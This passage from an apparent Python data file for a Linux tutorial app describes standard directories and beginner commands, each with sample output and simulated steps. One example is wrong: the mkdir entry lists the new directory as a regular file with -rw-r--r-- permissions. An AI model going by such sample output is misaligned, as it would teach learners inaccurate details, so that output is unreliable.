            {"step": 1, "title": "User types ls", "desc": "Shell resolves command path via PATH", "from": "Shell", "to": "$PATH", "data": "/bin:/usr/bin:/sbin", "color": "#3498db"},
            {"step": 2, "title": "Finds /bin/ls", "desc": "First match wins", "from": "$PATH", "to": "/bin/ls", "data": "Binary found", "color": "#f39c12"},
            {"step": 3, "title": "Executes", "desc": "Kernel execve() runs /bin/ls", "from": "/bin/ls", "to": "Output", "data": "Files listed", "color": "#27ae60"}
        ]
    },
    {
        "path": "/etc", "name": "Configuration Files", "icon": "📝", "color": "#f39c12",
        "description": "System-wide configuration files (text-based).",
        "contains": ["/etc/passwd", "/etc/shadow", "/etc/group", "/etc/hosts", "/etc/fstab", "/etc/sudoers"],
        "importance": "Critical — corrupted /etc/passwd = no login possible.",
        "output": """$ ls /etc | head -20
adduser.conf   fstab      hostname   hosts     login.defs
passwd         shadow     group      sudoers   ssh/
resolv.conf    crontab    fstab      mtab      os-release""",
        "explanation": "The heart of Linux configuration. Every service reads its config from /etc. Backup before editing — most files are plain text and mistakes can break the system.",
        "simulation": [
            {"step": 1, "title": "Service starts", "desc": "sshd starts on boot", "from": "systemd", "to": "sshd", "data": "Start service", "color": "#f39c12"},
            {"step": 2, "title": "Reads config", "desc": "sshd reads /etc/ssh/sshd_config", "from": "sshd", "to": "/etc", "data": "Port 22", "color": "#3498db"},
            {"step": 3, "title": "Applies settings", "desc": "Uses config values to bind port", "from": "/etc", "to": "sshd", "data": "Listening on :22", "color": "#27ae60"}
        ]
    },
    {
        "path": "/home", "name": "User Home Directories", "icon": "🏠", "color": "#9b59b6",
        "description": "Each user gets a directory here (/home/alice, /home/bob).",
        "contains": ["Desktop", "Documents", ".bashrc", ".ssh/"],
        "importance": "Where user data lives. Disks can fill up here.",
        "output": """$ ls /home
alice  bob  charlie

$ ls -la /home/alice
drwx------  5 alice alice 4096 Jan 15 10:00 .
drwxr-xr-x  3 root  root  4096 Jan 10 09:00 ..
drwxr-xr-x  2 alice alice 4096 Jan 15 10:00 Documents
-rw-r--r--  1 alice alice  220 Jan 10 09:00 .bashrc
drwx------  2 alice alice 4096 Jan 12 15:00 .ssh""",
        "explanation": "Every regular user gets a home directory. Their dotfiles (.bashrc, .profile, .ssh/) live here. Permissions are typically 700 or 750 to protect private data.",
        "simulation": [
            {"step": 1, "title": "User logs in", "desc": "PAM authenticates and reads /etc/passwd", "from": "Login", "to": "/etc/passwd", "data": "Home: /home/alice", "color": "#9b59b6"},
            {"step": 2, "title": "cd to home", "desc": "Shell chdir() to /home/alice", "from": "Shell", "to": "/home/alice", "data": "pwd → /home/alice", "color": "#3498db"},
            {"step": 3, "title": "Source dotfiles", "desc": ".bashrc, .profile loaded", "from": "/home/alice", "to": "Shell", "data": "Environment set", "color": "#27ae60"}
        ]
    },
    {
        "path": "/root", "name": "Root User's Home", "icon": "👑", "color": "#c0392b",
        "description": "The superuser's home directory. Different from /.",
        "contains": [".bashrc", "private scripts"],
        "importance": "Only root can access it (permission 700).",
        "output": """$ ls -la /root
drwx------  5 root root 4096 Jan 15 10:00 .
drwxr-xr-x 20 root root 4096 Jan 10 09:00 ..
-rw-------  1 root root 3106 Jan 10 09:00 .bashrc
drwx------  2 root root 4096 Jan 12 15:00 .ssh
-rw-------  1 root root  512 Jan 15 10:00 audit.log""",
        "explanation": "Root's private home. Permission 700 means only root can even list its contents. Sensitive scripts, SSH keys, and logs often live here.",
        "simulation": [
            {"step": 1, "title": "sudo su -", "desc": "User switches to root", "from": "User", "to": "Root", "data": "sudo su -", "color": "#c0392b"},
            {"step": 2, "title": "cd /root", "desc": "Root's shell starts in /root (not /)", "from": "Shell", "to": "/root", "data": "pwd → /root", "color": "#3498db"},
            {"step": 3, "title": "Full access", "desc": "Root can read/write anything", "from": "/root", "to": "Kernel", "data": "No permission checks", "color": "#27ae60"}
        ]
    },
    {
        "path": "/var", "name": "Variable Data", "icon": "📊", "color": "#16a085",
        "description": "Data that changes frequently — logs, mail, spool, cache.",
        "contains": ["/var/log", "/var/www", "/var/mail", "/var/spool"],
        "importance": "Logs and web content — fills up and breaks systems if not rotated.",
        "output": """$ ls /var
backups  cache  lib  local  lock  log  mail  opt  run  spool  tmp  www

$ ls /var/log
auth.log  dpkg.log  kern.log  syslog  nginx/  journal/""",
        "explanation": "/var holds data that grows or changes at runtime. Log files, mail spools, print queues, and website content all live here. logrotate keeps /var/log from filling the disk.",
        "simulation": [
            {"step": 1, "title": "Service writes log", "desc": "nginx writes to /var/log/nginx/", "from": "nginx", "to": "/var/log", "data": "access.log", "color": "#16a085"},
            {"step": 2, "title": "logrotate runs daily", "desc": "Compresses and rotates old logs", "from": "cron", "to": "/var/log", "data": "access.log.1.gz", "color": "#f39c12"},
            {"step": 3, "title": "Disk full prevention", "desc": "Old logs deleted based on policy", "from": "logrotate", "to": "Disk", "data": "Freed 500 MB", "color": "#27ae60"}
        ]
    },
    {
        "path": "/tmp", "name": "Temporary Files", "icon": "🗑️", "color": "#95a5a6",
        "description": "Temp files — wiped on reboot on most systems.",
        "contains": ["Session files", "installer scratch"],
        "importance": "Wrong permissions here = security risk (symlink attacks).",
        "output": """$ ls -la /tmp
drwxrwxrwt 15 root root 4096 Jan 15 10:00 .
-rw-r--r--  1 alice alice 4096 Jan 15 10:00 session_xyz
drwx------  2 bob  bob   4096 Jan 15 10:00 bob_tmp""",
        "explanation": "Notice the `t` in `drwxrwxrwt` — this is the sticky bit. It means anyone can create files here, but only the owner can delete their own files. Prevents users from deleting each other's temp files.",
        "simulation": [
            {"step": 1, "title": "App creates temp file", "desc": "Program writes to /tmp/session_xyz", "from": "App", "to": "/tmp", "data": "Create file", "color": "#95a5a6"},
            {"step": 2, "title": "Sticky bit check", "desc": "Another user tries to delete it — denied", "from": "User 2", "to": "/tmp", "data": "rm: denied", "color": "#e74c3c"},
            {"step": 3, "title": "Reboot wipes", "desc": "systemd-tmpfiles cleans on boot", "from": "Boot", "to": "/tmp", "data": "Files removed", "color": "#27ae60"}
        ]
    },
    {
        "path": "/usr", "name": "User System Resources", "icon": "📚", "color": "#e67e22",
        "description": "Read-only user programs and libraries.",
        "contains": ["/usr/bin", "/usr/lib", "/usr/share", "/usr/local"],
        "importance": "Most software lives here.",
        "output": """$ ls /usr
bin  games  include  lib  libexec  local  sbin  share  src

$ ls /usr/bin | wc -l
1247""",
        "explanation": "The biggest directory on most systems. Contains all user-space programs and libraries. On modern distros, /bin → /usr/bin (merged /usr).",
        "simulation": [
            {"step": 1, "title": "apt installs package", "desc": "Downloaded .deb unpacked", "from": "apt", "to": "/usr", "data": "Extracting...", "color": "#e67e22"},
            {"step": 2, "title": "Binaries → /usr/bin", "desc": "Executables placed in /usr/bin", "from": "dpkg", "to": "/usr/bin", "data": "vim, git, etc", "color": "#3498db"},
            {"step": 3, "title": "Libraries → /usr/lib", "desc": "Shared .so files installed", "from": "dpkg", "to": "/usr/lib", "data": "lib*.so", "color": "#27ae60"}
        ]
    },
    {
        "path": "/opt", "name": "Optional Software", "icon": "📦", "color": "#8e44ad",
        "description": "Third-party applications — self-contained packages.",
        "contains": ["Google Chrome", "custom software"],
        "importance": "Where you install non-distro software.",
        "output": """$ ls /opt
google  slack  teamviewer  zoom

$ ls /opt/google
chrome""",
        "explanation": "Manual installs (like Chrome, Zoom, TeamViewer) often go here because they're self-contained and don't follow distro packaging.",
        "simulation": [
            {"step": 1, "title": "Download .deb", "desc": "User downloads chrome.deb", "from": "Browser", "to": "Downloads", "data": "chrome.deb", "color": "#8e44ad"},
            {"step": 2, "title": "sudo dpkg -i", "desc": "Extracts to /opt/google/chrome/", "from": "dpkg", "to": "/opt", "data": "Extracting", "color": "#3498db"},
            {"step": 3, "title": "Symlink in /usr/bin", "desc": "Adds /usr/bin/google-chrome", "from": "dpkg", "to": "/usr/bin", "data": "Symlink created", "color": "#27ae60"}
        ]
    },
    {
        "path": "/dev", "name": "Device Files", "icon": "💽", "color": "#2980b9",
        "description": "Special files representing hardware (disks, terminals).",
        "contains": ["/dev/sda", "/dev/null", "/dev/tty", "/dev/random"],
        "importance": "Without /dev, no disk access.",
        "output": """$ ls /dev | head -20
autofs  block  bsg  btrfs-control  bus  char  console  core
cpu  cpu_dma_latency  disk  dri  fd  full  fuse  hpet  hugepages
input  kmsg  log  loop0  loop1  mem  mqueue  net  null  pts""",
        "explanation": "Everything is a file in Linux — even hardware. Writing to /dev/null discards data. Reading /dev/random gives random bytes. /dev/sda is your first disk.",
        "simulation": [
            {"step": 1, "title": "Plug in USB", "desc": "Kernel detects new device", "from": "USB", "to": "Kernel", "data": "usb-storage", "color": "#2980b9"},
            {"step": 2, "title": "Create device node", "desc": "Kernel creates /dev/sdb", "from": "Kernel", "to": "/dev", "data": "mknod sdb", "color": "#3498db"},
            {"step": 3, "title": "udev creates symlink", "desc": "/dev/disk/by-uuid/xyz → sdb1", "from": "udev", "to": "/dev", "data": "Symlink ready", "color": "#27ae60"}
        ]
    },
    {
        "path": "/proc", "name": "Process Information", "icon": "👁️", "color": "#34495e",
        "description": "Virtual filesystem exposing kernel + process data.",
        "contains": ["/proc/cpuinfo", "/proc/meminfo", "/proc/PID/"],
        "importance": "How tools like top, ps, and free get their data.",
        "output": """$ cat /proc/cpuinfo | head -5
processor	: 0
vendor_id	: GenuineIntel
cpu family	: 6
model		: 158
model name	: Intel(R) Core(TM) i7-8700K

$ ls /proc/1/
attr  cmdline  cwd  environ  exe  fd  status""",
        "explanation": "A virtual filesystem — nothing is on disk. Everything is generated on-read by the kernel. Perfect for reading CPU/memory/system info without running commands.",
        "simulation": [
            {"step": 1, "title": "Tool reads /proc", "desc": "top reads /proc/stat", "from": "top", "to": "/proc", "data": "cat /proc/stat", "color": "#34495e"},
            {"step": 2, "title": "Kernel generates", "desc": "Kernel computes live CPU values", "from": "Kernel", "to": "/proc", "data": "cpu 1234 0 890...", "color": "#f39c12"},
            {"step": 3, "title": "Tool renders", "desc": "top displays on screen", "from": "/proc", "to": "top", "data": "0.5% CPU", "color": "#27ae60"}
        ]
    },
    {
        "path": "/boot", "name": "Boot Files", "icon": "🚀", "color": "#d35400",
        "description": "Kernel + bootloader files.",
        "contains": ["vmlinuz", "initrd.img", "grub/"],
        "importance": "Missing /boot = system won't boot.",
        "output": """$ ls /boot
config-5.15.0-91-generic  initrd.img-5.15.0-91-generic
grub/                      vmlinuz-5.15.0-91-generic
System.map-5.15.0-91-generic""",
        "explanation": "Contains the kernel (vmlinuz), initial RAM disk (initrd), GRUB bootloader files, and System.map. If /boot is on a separate partition and fills up, kernel upgrades fail.",
        "simulation": [
            {"step": 1, "title": "UEFI/BIOS loads", "desc": "Firmware reads bootloader", "from": "BIOS", "to": "GRUB", "data": "Load GRUB", "color": "#d35400"},
            {"step": 2, "title": "GRUB reads /boot", "desc": "Finds vmlinuz + initrd", "from": "GRUB", "to": "/boot", "data": "vmlinuz-5.15", "color": "#3498db"},
            {"step": 3, "title": "Kernel boots", "desc": "Decompresses kernel into RAM", "from": "/boot", "to": "Kernel", "data": "Kernel running", "color": "#27ae60"}
        ]
    },
    {
        "path": "/media", "name": "Removable Media", "icon": "💾", "color": "#16a085",
        "description": "Auto-mounted USB drives, CDs, DVDs.",
        "contains": ["USB sticks", "external HDDs"],
        "importance": "Where your USB drive appears when plugged in.",
        "output": """$ ls /media/alice
KINGSTON  Samsung_T5""",
        "explanation": "When you plug in a USB drive on a desktop distro, it auto-mounts here. Different from /mnt (manual mounts).",
        "simulation": [
            {"step": 1, "title": "Plug USB", "desc": "Kernel detects /dev/sdb1", "from": "USB", "to": "Kernel", "data": "New block device", "color": "#16a085"},
            {"step": 2, "title": "udisks2 mounts", "desc": "Auto-mounts to /media/user/", "from": "udisks2", "to": "/media", "data": "mount /dev/sdb1", "color": "#3498db"},
            {"step": 3, "title": "File manager opens", "desc": "GUI shows mounted drive", "from": "/media", "to": "Nautilus", "data": "Drive visible", "color": "#27ae60"}
        ]
    },
    {
        "path": "/sbin", "name": "System Binaries", "icon": "🔧", "color": "#27ae60",
        "description": "System administration binaries (boot, fsck, iptables, ifconfig).",
        "contains": ["ifconfig", "iptables", "reboot", "fsck", "mkfs"],
        "importance": "Admin can't manage system without /sbin.",
        "output": """$ ls /sbin | head -15
agetty    fsck      iptables  mkfs      reboot
blkid     halt      ldconfig  mkswap    route
fdisk     ifconfig  lsmod     modprobe  sysctl""",
        "explanation": "Contains binaries usually only run by root — for system administration. On modern systems, /sbin is a symlink to /usr/sbin.",
        "simulation": [
            {"step": 1, "title": "Admin runs reboot", "desc": "Types sudo reboot", "from": "Admin", "to": "Shell", "data": "sudo reboot", "color": "#27ae60"},
            {"step": 2, "title": "Shell finds /sbin/reboot", "desc": "PATH lookup", "from": "Shell", "to": "/sbin/reboot", "data": "Binary found", "color": "#f39c12"},
            {"step": 3, "title": "Kernel reboots", "desc": "System powers off + restarts", "from": "/sbin/reboot", "to": "Kernel", "data": "System reboot", "color": "#e74c3c"}
        ]
    }
]

# ==================== LINUX: COMMANDS (with modal data) ====================
LINUX_COMMANDS = [
    {
        "command": "pwd", "desc": "Print working directory", "category": "Navigation",
        "output": "$ pwd\n/home/alice",
        "explanation": "Shows the absolute path of your current directory. Useful when you lose track of where you are in the filesystem.",
        "flags": [],
        "simulation": [
            {"step": 1, "title": "Shell asks kernel", "desc": "getcwd() syscall", "from": "Shell", "to": "Kernel", "data": "getcwd()", "color": "#3498db"},
            {"step": 2, "title": "Kernel returns path", "desc": "Full path string", "from": "Kernel", "to": "Shell", "data": "/home/alice", "color": "#27ae60"}
        ]
    },
    {
        "command": "ls", "desc": "List files in current directory", "category": "Navigation",
        "output": "$ ls\ndesktop.txt  Documents  Downloads  Music  Pictures",
        "explanation": "Lists files and directories in the current directory. Without flags, hidden files (starting with .) are not shown.",
        "flags": [{"flag": "-l", "desc": "Long format"}, {"flag": "-a", "desc": "Include hidden"}, {"flag": "-h", "desc": "Human-readable sizes"}],
        "simulation": [
            {"step": 1, "title": "ls reads directory", "desc": "opendir() on current dir", "from": "ls", "to": "Kernel", "data": "opendir('.')", "color": "#3498db"},
            {"step": 2, "title": "Reads entries", "desc": "readdir() loop", "from": "Kernel", "to": "ls", "data": "desktop.txt, Documents...", "color": "#f39c12"},
            {"step": 3, "title": "Prints sorted", "desc": "Alphabetical order", "from": "ls", "to": "Terminal", "data": "Files listed", "color": "#27ae60"}
        ]
    },
    {
        "command": "ls -la", "desc": "List ALL files (including hidden) in long format", "category": "Navigation",
        "output": """$ ls -la
total 28
drwxr-xr-x  5 alice alice 4096 Jan 15 10:00 .
drwxr-xr-x  3 root  root  4096 Jan 10 09:00 ..
-rw-r--r--  1 alice alice  220 Jan 10 09:00 .bash_logout
-rw-r--r--  1 alice alice 3771 Jan 10 09:00 .bashrc
drwxr-xr-x  2 alice alice 4096 Jan 15 10:00 Documents
drwxr-xr-x  2 alice alice 4096 Jan 10 09:00 Downloads""",
        "explanation": "Long format shows permissions, owner, group, size, modification date, and name. The -a flag includes dotfiles (hidden). First two entries (. and ..) are current and parent directories.",
        "flags": [{"flag": "l", "desc": "Long listing"}, {"flag": "a", "desc": "All files"}, {"flag": "h", "desc": "Human sizes"}],
        "simulation": [
            {"step": 1, "title": "Stat each file", "desc": "stat() syscall for every entry", "from": "ls", "to": "Kernel", "data": "stat(*)", "color": "#3498db"},
            {"step": 2, "title": "Format columns", "desc": "Builds permission string + metadata", "from": "Kernel", "to": "ls", "data": "-rw-r--r-- alice...", "color": "#f39c12"},
            {"step": 3, "title": "Print table", "desc": "Aligned output", "from": "ls", "to": "Terminal", "data": "Long listing", "color": "#27ae60"}
        ]
    },
    {
        "command": "cd /path", "desc": "Change directory", "category": "Navigation",
        "output": "$ cd /etc\n$ pwd\n/etc",
        "explanation": "Changes your current working directory. cd without arguments goes to $HOME. cd - returns to previous directory.",
        "flags": [],
        "simulation": [
            {"step": 1, "title": "cd resolves path", "desc": "Converts relative to absolute", "from": "Shell", "to": "Path resolver", "data": "/etc", "color": "#3498db"},
            {"step": 2, "title": "chdir() syscall", "desc": "Kernel changes process cwd", "from": "Shell", "to": "Kernel", "data": "chdir('/etc')", "color": "#f39c12"},
            {"step": 3, "title": "CWD updated", "desc": "getcwd() returns new path", "from": "Kernel", "to": "Shell", "data": "Now in /etc", "color": "#27ae60"}
        ]
    },
    {
        "command": "cd ..", "desc": "Go up one directory", "category": "Navigation",
        "output": "$ pwd\n/etc/nginx\n$ cd ..\n$ pwd\n/etc",
        "explanation": "Moves up one level. .. always refers to the parent directory.",
        "flags": [],
        "simulation": [
            {"step": 1, "title": "Resolve ..", "desc": "Shell resolves .. to parent path", "from": "Shell", "to": "Path", "data": "/etc/nginx/..", "color": "#3498db"},
            {"step": 2, "title": "chdir()", "desc": "Kernel updates cwd", "from": "Shell", "to": "Kernel", "data": "chdir('/etc')", "color": "#27ae60"}
        ]
    },
    {
        "command": "cd ~", "desc": "Go to home directory", "category": "Navigation",
        "output": "$ cd ~\n$ pwd\n/home/alice",
        "explanation": "~ is a shell shortcut for $HOME, the current user's home directory.",
        "flags": [],
        "simulation": [
            {"step": 1, "title": "Expand ~", "desc": "Shell expands ~ to $HOME", "from": "Shell", "to": "Env", "data": "$HOME=/home/alice", "color": "#3498db"},
            {"step": 2, "title": "cd to home", "desc": "chdir() to expanded path", "from": "Shell", "to": "Kernel", "data": "Now in home", "color": "#27ae60"}
        ]
    },
    {
        "command": "cp source dest", "desc": "Copy files", "category": "File Operations",
        "output": "$ cp file.txt /tmp/\n$ cp -r folder/ /backup/\n$ ls -la /tmp/file.txt\n-rw-r--r-- 1 alice alice 512 Jan 15 14:23 /tmp/file.txt",
        "explanation": "Copies files. Use -r for directories (recursive). Destination can be a new name or a directory.",
        "flags": [{"flag": "-r", "desc": "Recursive (directories)"}, {"flag": "-v", "desc": "Verbose"}, {"flag": "-p", "desc": "Preserve permissions/timestamps"}],
        "simulation": [
            {"step": 1, "title": "Open source", "desc": "Kernel opens source for reading", "from": "cp", "to": "Kernel", "data": "open(file.txt, R)", "color": "#3498db"},
            {"step": 2, "title": "Create dest", "desc": "Creates /tmp/file.txt", "from": "cp", "to": "Kernel", "data": "open(/tmp/file.txt, W)", "color": "#f39c12"},
            {"step": 3, "title": "Copy bytes", "desc": "read/write loop", "from": "Kernel", "to": "cp", "data": "512 bytes copied", "color": "#27ae60"}
        ]
    },
    {
        "command": "mv source dest", "desc": "Move or rename files", "category": "File Operations",
        "output": "$ mv old.txt new.txt\n$ mv file.txt /tmp/",
        "explanation": "Moves or renames files. On the same filesystem it's a rename() syscall (instant). Across filesystems it's a copy + delete.",
        "flags": [{"flag": "-v", "desc": "Verbose"}, {"flag": "-n", "desc": "No-clobber (don't overwrite)"}],
        "simulation": [
            {"step": 1, "title": "Same filesystem?", "desc": "Check if source/dest on same disk", "from": "mv", "to": "Kernel", "data": "Same FS → rename", "color": "#3498db"},
            {"step": 2, "title": "rename() syscall", "desc": "Fast — no data copied", "from": "Kernel", "to": "FS", "data": "Inode link updated", "color": "#27ae60"}
        ]
    },
    {
        "command": "rm file", "desc": "Delete file", "category": "File Operations",
        "output": "$ rm temp.txt\n$ rm -rf folder/    # DANGEROUS!\n$ ls\n(no output — file gone)",
        "explanation": "Deletes files. Once deleted with rm, files are hard to recover. -r removes directories recursively. -f forces without prompt.",
        "flags": [{"flag": "-r", "desc": "Recursive"}, {"flag": "-f", "desc": "Force (no prompt)"}, {"flag": "-i", "desc": "Interactive (prompt)"}],
        "simulation": [
            {"step": 1, "title": "unlink() syscall", "desc": "Kernel removes directory entry", "from": "rm", "to": "Kernel", "data": "unlink('temp.txt')", "color": "#e74c3c"},
            {"step": 2, "title": "Reference count", "desc": "Inode link count decrements", "from": "Kernel", "to": "Inode", "data": "nlink 1 → 0", "color": "#f39c12"},
            {"step": 3, "title": "Mark blocks free", "desc": "Data blocks returned to pool", "from": "Kernel", "to": "FS", "data": "Blocks freed", "color": "#27ae60"}
        ]
    },
    {
        "command": "mkdir newdir", "desc": "Create directory", "category": "File Operations",
        "output": "$ mkdir projects\n$ mkdir -p a/b/c\n$ ls -la\n-rw-r--r-- 1 alice alice 4096 Jan 15 14:23 projects",
        "explanation": "Creates a new directory. Use -p to create parent directories if they don't exist.",
        "flags": [{"flag": "-p", "desc": "Create parents"}, {"flag": "-m", "desc": "Set mode"}],
        "simulation": [
            {"step": 1, "title": "mkdir() syscall", "desc": "Kernel creates new inode of type directory", "from": "mkdir", "to": "Kernel", "data": "mkdir('projects', 0755)", "color": "#3498db"},
            {"step": 2, "title": "Parent updated", "desc": "Adds entry to parent directory", "from": "Kernel", "to": "FS", "data": "Dir created", "color": "#27ae60"}
        ]
    },
    {
        "command": "touch file.txt", "desc": "Create empty file or update timestamp", "category": "File Operations",
        "output": "$ touch notes.txt\n$ ls -la notes.txt\n-rw-r--r-- 1 alice alice 0 Jan 15 14:23 notes.txt",
        "explanation": "Creates an empty file if it doesn't exist. If it does, updates its access and modification times.",
        "flags": [{"flag": "-a", "desc": "Only change access time"}, {"flag": "-m", "desc": "Only change modification time"}],
        "simulation": [
            {"step": 1, "title": "open(O_CREAT)", "desc": "Kernel creates or opens file", "from": "touch", "to": "Kernel", "data": "open(notes.txt, CREAT)", "color": "#3498db"},
            {"step": 2, "title": "utime()", "desc": "Updates timestamps", "from": "Kernel", "to": "Inode", "data": "atime=mtime=now", "color": "#27ae60"}
        ]
    },
    {
        "command": "cat file", "desc": "Display file contents", "category": "File Operations",
        "output": "$ cat /etc/hostname\nkali\n\n$ cat /etc/passwd | head -3\nroot:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin",
        "explanation": "Concatenates and prints file contents. Best for short files. Use less for long files.",
        "flags": [{"flag": "-n", "desc": "Number lines"}, {"flag": "-A", "desc": "Show non-printing chars"}],
        "simulation": [
            {"step": 1, "title": "Open file", "desc": "Kernel opens file for reading", "from": "cat", "to": "Kernel", "data": "open(hostname, R)", "color": "#3498db"},
            {"step": 2, "title": "Read chunks", "desc": "read() 4096 bytes at a time", "from": "Kernel", "to": "cat", "data": "kali\\n", "color": "#f39c12"},
            {"step": 3, "title": "Write to stdout", "desc": "write() to terminal", "from": "cat", "to": "Terminal", "data": "Displayed", "color": "#27ae60"}
        ]
    },
    {
        "command": "less file", "desc": "View file page by page", "category": "File Operations",
        "output": "$ less /var/log/syslog\nJan 15 14:23:45 host kernel: [    0.000000] Linux version 5.15.0\nJan 15 14:23:46 host systemd[1]: Started User Manager\nJan 15 14:23:47 host NetworkManager[890]: <info> device (eth0)\n(lines scroll with j/k, press q to quit)",
        "explanation": "Pager — shows file one screen at a time. Use arrow keys or j/k to navigate, /pattern to search, q to quit. Better than cat for long files.",
        "flags": [{"flag": "-N", "desc": "Show line numbers"}, {"flag": "+F", "desc": "Follow mode (like tail -f)"}],
        "simulation": [
            {"step": 1, "title": "Open file", "desc": "less reads the file", "from": "less", "to": "Kernel", "data": "Read syslog", "color": "#3498db"},
            {"step": 2, "title": "Display first screen", "desc": "Shows 24 lines (terminal height)", "from": "less", "to": "Terminal", "data": "First page", "color": "#f39c12"},
            {"step": 3, "title": "Wait for input", "desc": "Arrow keys scroll, / searches", "from": "User", "to": "less", "data": "Navigate", "color": "#27ae60"}
        ]
    },
    {
        "command": "head -n 5 file", "desc": "Show first 5 lines", "category": "File Operations",
        "output": "$ head -n 5 /etc/passwd\nroot:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\nsync:x:4:65534:sync:/bin:/bin/sync",
        "explanation": "Displays the first N lines of a file (default 10). Perfect for peeking at large files without loading everything.",
        "flags": [{"flag": "-n N", "desc": "First N lines"}, {"flag": "-c N", "desc": "First N bytes"}],
        "simulation": [
            {"step": 1, "title": "Open file", "desc": "Read from start", "from": "head", "to": "Kernel", "data": "Read line 1", "color": "#3498db"},
            {"step": 2, "title": "Count lines", "desc": "Stop after 5 newlines", "from": "Kernel", "to": "head", "data": "5 lines read", "color": "#f39c12"},
            {"step": 3, "title": "Print", "desc": "Output the lines", "from": "head", "to": "Terminal", "data": "Displayed", "color": "#27ae60"}
        ]
    },
    {
        "command": "tail -f logfile", "desc": "Follow a growing log file", "category": "File Operations",
        "output": """$ tail -f /var/log/auth.log
Jan 15 14:23:45 host sshd[1234]: Accepted password for alice from 192.168.1.50
Jan 15 14:23:46 host sshd[1234]: pam_unix(sshd:session): session opened
Jan 15 14:23:47 host sudo: alice : TTY=pts/0 ; PWD=/home/alice ; USER=root
(new lines appear as they're written — Ctrl+C to stop)""",
        "explanation": "Follow mode — keeps the file open and displays new lines as they're appended. Indispensable for monitoring logs in real time.",
        "flags": [{"flag": "-f", "desc": "Follow (live)"}, {"flag": "-n N", "desc": "Start with last N lines"}],
        "simulation": [
            {"step": 1, "title": "Open + seek end", "desc": "tail opens file and seeks to end", "from": "tail", "to": "Kernel", "data": "lseek(END)", "color": "#3498db"},
            {"step": 2, "title": "Show last 10 lines", "desc": "Displays recent lines", "from": "Kernel", "to": "tail", "data": "Last lines shown", "color": "#f39c12"},
            {"step": 3, "title": "Watch for writes", "desc": "inotify() waits for file changes", "from": "tail", "to": "Kernel", "data": "Live updates", "color": "#27ae60"}
        ]
    },
    {
        "command": "grep pattern file", "desc": "Search text in files", "category": "Search",
        "output": """$ grep 'root' /etc/passwd
root:x:0:0:root:/root:/bin/bash

$ grep -i 'error' /var/log/syslog | head -3
Jan 15 10:00:01 host kernel: ERROR: firmware load failed
Jan 15 10:05:12 host app[1234]: Error: connection timeout
Jan 15 10:10:33 host systemd: Failed to start Foo (error 1)""",
        "explanation": "Searches for a pattern in file contents. Case-sensitive by default. -i ignores case, -r recurses into directories, -n shows line numbers.",
        "flags": [{"flag": "-i", "desc": "Case-insensitive"}, {"flag": "-r", "desc": "Recursive"}, {"flag": "-n", "desc": "Line numbers"}, {"flag": "-v", "desc": "Invert (non-matching)"}],
        "simulation": [
            {"step": 1, "title": "Read line by line", "desc": "grep reads file", "from": "grep", "to": "Kernel", "data": "Read line", "color": "#3498db"},
            {"step": 2, "title": "Match pattern", "desc": "Regex match against 'root'", "from": "grep", "to": "Matcher", "data": "MATCH", "color": "#f39c12"},
            {"step": 3, "title": "Print match", "desc": "Prints matching lines", "from": "grep", "to": "Terminal", "data": "root:x:0:0...", "color": "#27ae60"}
        ]
    },
    {
        "command": "find / -name file", "desc": "Find files by name", "category": "Search",
        "output": """$ find / -name 'passwd' 2>/dev/null
/etc/passwd
/etc/pam.d/passwd
/usr/share/doc/passwd
/usr/bin/passwd

$ find /home -type f -name "*.txt"
/home/alice/notes.txt
/home/alice/Documents/todo.txt""",
        "explanation": "Walks the filesystem tree looking for files matching criteria. -name matches filenames, -type filters by type (f=file, d=dir), -size by size.",
        "flags": [{"flag": "-name", "desc": "Match by name"}, {"flag": "-type", "desc": "f=file d=dir"}, {"flag": "-size", "desc": "By size"}, {"flag": "-exec", "desc": "Run command on results"}],
        "simulation": [
            {"step": 1, "title": "Start at /", "desc": "find opens root directory", "from": "find", "to": "/", "data": "Read /", "color": "#3498db"},
            {"step": 2, "title": "Recurse into subdirs", "desc": "Opens each directory", "from": "find", "to": "FS", "data": "Walk tree", "color": "#f39c12"},
            {"step": 3, "title": "Match criteria", "desc": "Checks each file against 'passwd'", "from": "find", "to": "Matcher", "data": "4 matches", "color": "#27ae60"}
        ]
    },
    {
        "command": "which cmd", "desc": "Locate command binary", "category": "Search",
        "output": """$ which python3
/usr/bin/python3

$ which ls
/usr/bin/ls""",
        "explanation": "Shows the full path of the executable that would run if you typed the command. Uses the $PATH environment variable.",
        "flags": [{"flag": "-a", "desc": "Show all matches"}],
        "simulation": [
            {"step": 1, "title": "Read $PATH", "desc": "Get PATH env variable", "from": "which", "to": "Env", "data": "/usr/bin:/usr/local/bin", "color": "#3498db"},
            {"step": 2, "title": "Check each dir", "desc": "Look for python3 in each", "from": "which", "to": "$PATH", "data": "First match", "color": "#f39c12"},
            {"step": 3, "title": "Print path", "desc": "Return found path", "from": "which", "to": "Terminal", "data": "/usr/bin/python3", "color": "#27ae60"}
        ]
    },
    {
        "command": "ps aux", "desc": "List all running processes", "category": "Processes",
        "output": """$ ps aux
USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root         1  0.0  0.1 168564 11204 ?        Ss   09:00   0:03 /sbin/init
root       342  0.0  0.2  26844 18912 ?        Ss   09:00   0:00 /lib/systemd/systemd-journald
alice     1234  0.5  2.1 4523456 172032 ?      Sl   10:15   0:12 firefox
alice     2890  0.0  0.0  16848  3456 pts/0    Ss   14:22   0:00 bash""",
        "explanation": "Snapshot of every process. Columns: user, PID, CPU%, memory%, virtual size, RSS, terminal, state, start time, CPU time, command.",
        "flags": [{"flag": "a", "desc": "All users"}, {"flag": "u", "desc": "User format"}, {"flag": "x", "desc": "Include no-tty"}],
        "simulation": [
            {"step": 1, "title": "Read /proc", "desc": "ps iterates /proc/*/", "from": "ps", "to": "/proc", "data": "Read 312 PIDs", "color": "#3498db"},
            {"step": 2, "title": "Extract data", "desc": "Parses stat, status, cmdline", "from": "ps", "to": "Parsers", "data": "USER PID %CPU...", "color": "#f39c12"},
            {"step": 3, "title": "Print table", "desc": "Sorted by PID", "from": "ps", "to": "Terminal", "data": "Snapshot printed", "color": "#27ae60"}
        ]
    },
    {
        "command": "top", "desc": "Real-time process viewer", "category": "Processes",
        "output": """top - 14:23:45 up 5:23,  2 users,  load average: 0.15, 0.22, 0.18
Tasks: 312 total,   1 running, 311 sleeping,   0 stopped
